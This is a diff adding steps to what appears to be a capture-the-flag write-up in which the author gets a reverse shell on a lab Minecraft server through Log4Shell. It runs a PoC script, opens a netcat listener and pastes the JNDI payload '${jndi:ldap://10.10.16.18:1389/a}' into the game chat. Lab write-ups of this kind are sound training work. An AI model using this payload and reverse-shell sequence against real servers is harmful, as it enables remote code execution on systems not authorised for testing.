@@ -76,8 +76,39 @@ sudo java -jar TLauncher.jar
 
 after that select the correct release version and fill the minecraft account name, then procced on `Enter the game`.
 
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/edee156a-e103-44f7-8053-bff066a85aef)
 
+Clicking on `Multiplayer` allowed me to enter the server.
 
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/b0c99b16-e72e-4528-9c4e-f2236aee7da5)
+
+```
+10.10.11.249:25565
+```
+
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/f5e39e36-ac3c-4c1f-ba00-cf4a648214b3)
+
+I had to attempt logging in to the server multiple times, and each time I had to reset the box for it to function properly. Once I login to the server, I opened a terminal and ran the POC. and it will show a command (`${jndi:ldap://10.10.16.18:1389/a}`) I copied that.
+
+```
+python3 poc.py --userip <tun0 IP> --webport 80 --lport 4444
+```
+
+and open another terminal and create a netcat listener on port 4444
+
+```
+nc -nlvp 4444
+```
+
+then in minecraft, I press `t` (to send a message) and in the chat box i paste that copied command (`${jndi:ldap://10.10.16.18:1389/a}`), so in few second i got the reverse shell in my netcat listener.
+
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/3ffc0caf-9e4a-4e8a-9a97-b623affeb991)
+
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/1a10e978-4a64-48d8-9990-c9d7ed14e5a7)
+
+in below screenshot you can see whole process:
+
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/23388288-8ca3-4e85-bee1-e9a89d1c93c9)
 
 
 
